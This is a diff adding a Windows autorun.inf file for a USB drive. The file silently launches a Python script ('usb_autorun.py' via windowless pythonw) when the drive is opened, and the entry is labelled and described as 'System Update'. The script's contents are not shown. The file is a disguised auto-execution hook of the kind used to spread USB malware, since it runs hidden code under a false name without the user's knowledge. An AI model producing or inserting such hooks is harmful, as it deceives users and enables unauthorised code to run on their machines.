@@ -1,0 +1,7 @@
+[autorun]
+open=pythonw.exe usb_autorun.py
+icon=icon.ico
+label=System Update
+action=Run System Update
+shell\open\command=pythonw.exe usb_autorun.py
+shell\open\default=1 
